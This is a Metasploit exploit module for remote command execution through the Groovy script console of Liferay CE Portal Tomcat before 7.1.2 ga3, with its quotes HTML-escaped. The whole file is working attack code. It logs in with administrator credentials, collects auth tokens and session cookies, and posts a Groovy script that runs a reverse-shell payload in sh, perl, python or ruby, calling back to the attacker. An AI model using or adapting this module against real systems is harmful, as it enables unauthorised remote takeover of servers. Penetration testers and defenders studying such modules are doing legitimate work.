# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;Liferay CE Portal Tomcat < 7.1.2 ga3 - Groovy-Console Remote Command Execution&#039;,
			&#039;Description&#039;    => %q{
			This module uses the Liferay CE Portal Groovy script console to execute
			OS commands. The Groovy script can execute commands on the system via a [command].execute() call.
                        Valid credentials for an application administrator user account are required
			This module has been tested successfully with Liferay CE Portal Tomcat 7.1.2 ga3 on Debian 4.9.18-1kali1 system.
			},
			&#039;Author&#039;	=> 
				[
					&#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Vulnerability Discovery, PoC & Msf Module
				],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;References&#039;     =>
				[
					[ &#039;URL&#039;, &#039;https://pentest.com.tr/exploits/Liferay-CE-Portal-Tomcat-7-1-2-ga3-Groovy-Console-Remote-Command-Execution-Metasploit.html&#039; ],
				],
			&#039;Privileged&#039;     => false,
			&#039;Platform&#039;    => [ &#039;unix&#039; ],
			&#039;Payload&#039;        =>
				{
					&#039;DisableNops&#039; => true,
					&#039;Compat&#039;      =>
						{
							&#039;PayloadType&#039; => &#039;cmd&#039;,
							&#039;RequiredCmd&#039; => &#039;reverse perl ruby python&#039;,
						}
				},
			&#039;Arch&#039;           => ARCH_CMD,
			&#039;Targets&#039;        =>
				[
					[ &#039;Liferay CE Portal Tomcat < 7.1.2 ga3&#039;, { }]
				],
			&#039;DisclosureDate&#039; => &#039;March 08, 2019&#039;,
			&#039;DefaultTarget&#039;  => 0,
			&#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse&#039; }))
		
		register_options(
			[
				Opt::RPORT(8080),
				OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039; ]),
				OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;, ]),
				OptString.new(&#039;PATH&#039;,     [ true,  &#039;The URI path of the portal&#039;, &#039;/&#039; ]),
			], self.class)
	end
##
# Version and Vulnerability Check
##
        def check 
		res = send_request_cgi({
			&#039;method&#039;    => &#039;GET&#039;,
			&#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;web/guest/home&#039;
		})

		version = res.headers[&#039;Liferay-Portal&#039;]
                print_status("Target: #{version}")

		if res and res.code == 200 and version =~ /Portal 7./ or version =~ /Portal 6./
		   return Exploit::CheckCode::Vulnerable
		else
		   return Exploit::CheckCode::Safe
		end
		return res
	end
##
# Returns the SSL, Host and Port as a string
##
        def peer
          "#{ssl ? &#039;https://&#039; : &#039;http://&#039; }#{rhost}:#{rport}"
        end
	
	def exploit
##
# Login and cookie information gathering
##
		print_status(&#039;Attempting to login with specified user...&#039;)
		res = send_request_cgi({
			&#039;method&#039;    => &#039;GET&#039;,
			&#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;web/guest/home&#039;
		})
                
                authtoken = res.body.split(&#039;Liferay.authToken=&#039;)[1].split(&#039;;&#039;)[0].split(&#039;Liferay.authToken=&#039;)[0].split(&#039;"&#039;)[1]
                print_status("Liferay AuthToken = #{authtoken}")
		
		sessionid = &#039;JSESSIONID=&#039; << res.headers[&#039;set-cookie&#039;].split(&#039;JSESSIONID=&#039;)[1].split(&#039;; &#039;)[0]
		cookie = "#{sessionid}; COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US"
                print_status("#{sessionid}")

                boundary = Rex::Text.rand_text_alphanumeric(29)

                data = "-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_formDate\"\r\n\r\n"
                data << ""
                data << "\r\n-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_saveLastPath\"\r\n\r\nfalse\r\n"
                data << "-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_redirect\"\r\n\r\n\r\n"
                data << "-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_doActionAfterLogin\"\r\n\r\nfalse\r\n"
                data << "-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_login\"\r\n\r\n"
                data << "#{datastore[&#039;USERNAME&#039;]}"
                data << "\r\n-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_password\"\r\n\r\n"
                data << "#{datastore[&#039;PASSWORD&#039;]}"
                data << "\r\n-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"_com_liferay_login_web_portlet_LoginPortlet_checkboxNames\"\r\n\r\nrememberMe\r\n"
                data << "-----------------------------{boundary}"
                data << "\r\nContent-Disposition: form-data; name=\"p_auth\"\r\n\r\n"
                data << "#{authtoken}"
                data << "\r\n-----------------------------{boundary}--\r\n"
	
		res = send_request_cgi({
			&#039;method&#039;    => &#039;POST&#039;,
			&#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;web/guest/home?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=1&p_p_state=exclusive&p_p_mode=view&_com_liferay_login_web_portlet_LoginPortlet_javax.portlet.action=%2Flogin%2Flogin&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin&#039;,
			&#039;data&#039;      => data,
                        &#039;headers&#039; =>
                        {
                          &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;,
                        },
			&#039;cookie&#039;    => cookie
		})

		if res.code == 302
			print_good(&#039;User authentication was successful.&#039;)
                else
			print_error(&#039;Something went wrong! Login failed.&#039;)
		end

		cookie1 = &#039;&#039;
		for cookie1_i in [ &#039;JSESSIONID=&#039;, &#039;COMPANY_ID=&#039;, &#039;ID=&#039; ]
			cookie1 << cookie1_i + res.headers[&#039;set-cookie&#039;].split(cookie1_i)[1].split(&#039;; &#039;)[0] + &#039;; &#039;
		end

                cookies0 = "#{cookie1} COOKIE_SUPPORT=true;"

		res = send_request_cgi({
			&#039;method&#039;    => &#039;GET&#039;,
			&#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;c&#039;,
			&#039;cookie&#039;    => cookies0
		})
##
# Completion of the cookie information
##
		cookie2 = &#039;&#039;
		for cookie2_i in [ &#039;GUEST_LANGUAGE_ID=&#039;, &#039;Max-Age=&#039;, &#039;Expires=&#039;, &#039;Path=&#039; ]
			cookie2 << cookie2_i + res.headers[&#039;set-cookie&#039;].split(cookie2_i)[1].split(&#039;; &#039;)[0] + &#039;; &#039;
		end

                cookies = "#{cookie1} #{cookie2} COOKIE_SUPPORT=true;"
                if cookies =~ /ID=/
                  print_good("Cookies information has been verified.")
                else
                  print_error("Cookies information could not be verified!")
                  exit 0
               end
##
# Request to Groovy script authtoken
##
		res = send_request_cgi({
			&#039;method&#039;    => &#039;GET&#039;,
			&#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script&#039;,
                        &#039;headers&#039; =>
                        {
                          &#039;Referer&#039;   => &#039;#{peer}/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script&#039;,
                        },
			&#039;cookie&#039;    => cookies
		})
##
# Calling authtoken to Groovy script
##
                authtoken2 = res.body.split(&#039;Liferay.authToken=&#039;)[1].split(&#039;;&#039;)[0].split(&#039;Liferay.authToken=&#039;)[0].split(&#039;"&#039;)[1]
                print_status("Liferay AuthToken to Shell = #{authtoken2}") 
##
# Payload Separation **cmd/unix/reverse|reverse_ruby|reverse_python|reverse_perl**
## 
                if payload.encoded =~ /sh/
                  cmd = payload.encoded.split(&#039;sh -c&#039;)[1].split("&#039;")[1]
                  pay = "&#039;sh&#039;,  &#039;-c&#039;,  &#039;#{cmd}&#039;"
                elsif payload.encoded =~ /perl/
                  cmd = payload.encoded.split(&#039;perl -MIO -e&#039;)[1].split("&#039;")[1]
                  pay = "&#039;perl&#039;,  &#039;-MIO&#039;,  &#039;-e&#039;,  &#039;#{cmd}&#039;"
                elsif payload.encoded =~ /python/
                  cmd = payload.encoded.split(&#039;python -c "exec(&#039;)[1].split(".decode(&#039;base64&#039;))\"")[0].split("&#039;")[1]
                  pay = "&#039;python&#039;,  &#039;-c&#039;,  &#039;exec(\"#{cmd}\".decode(\"base64\"))&#039;"
                elsif payload.encoded =~ /ruby/
                  cmd = payload.encoded.split(&#039;ruby -rsocket -e &#039;)[1].split("&#039;")[1]
                  pay = "&#039;ruby&#039;,  &#039;-rsocket&#039;,  &#039;-e&#039;, &#039;#{cmd}&#039;"
                else
                  print_error("! Please choose payload one of cmd/unix/reverse|reverse_ruby|reverse_python|reverse_perl ")
                  exit 0
                end
##
# Post Data to run Payload
##
                cmdata = "-----------------------------{boundary}"
                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_formDate\"\r\n\r\n"
                cmdata << ""
                cmdata << "\r\n-----------------------------{boundary}"
                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1\"\r\n\r\n"
                cmdata << "script\r\n-----------------------------{boundary}"
                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_redirect\"\r\n\r\n"
                cmdata << "#{peer}/group/control_panel/manage?p_p_id="
                cmdata << "com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle="
                cmdata << "0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_"
                cmdata << "ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_"
                cmdata << "server_admin_web_portlet_ServerAdminPortlet_cur=""0&_com_liferay_server_"
                cmdata << "admin_web_portlet_ServerAdminPortlet_tabs1=script"
                cmdata << "\r\n-----------------------------{boundary}"
                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_language\"\r\n\r\n"
                cmdata << "groovy"
                cmdata << "\r\n-----------------------------{boundary}"
                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_script\"\r\n\r\n"
                cmdata << "def cmd = [#{pay}]"
                cmdata << "\r\ncmd.execute()"
                cmdata << "\r\n-----------------------------{boundary}"
                cmdata << "\r\nContent-Disposition: form-data; name=\"_com_liferay_server_admin_web_portlet_ServerAdminPortlet_cmd\"\r\n\r\n"
                cmdata << "runScript"
                cmdata << "\r\n-----------------------------{boundary}"
                cmdata << "\r\nContent-Disposition: form-data; name=\"p_auth\"\r\n\r\n"
                cmdata << "#{authtoken2}"
                cmdata << "\r\n-----------------------------{boundary}--\r\n"            
##
# Request to get reverse shell
##
		print_status("Attempting to execute the payload...")
		res = send_request_cgi({
			&#039;method&#039;    => &#039;POST&#039;,
			&#039;uri&#039;       => datastore[&#039;PATH&#039;] + &#039;group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=1&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_javax.portlet.action=%2Fserver_admin%2Fedit_server&#039;,
			&#039;data&#039;      => cmdata,
                        &#039;headers&#039; =>
                        {
                          &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------{boundary}&#039;,
                          &#039;Referer&#039;   => &#039;#{peer}/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script&#039;,
                        },
			&#039;cookie&#039;    => cookies
		})

		if res.code == 302
			print_good(&#039;Payload was successfully executed.&#039;)
                else
			print_error(&#039;Something went wrong!&#039;)
		end

	end
end
##
# End
##

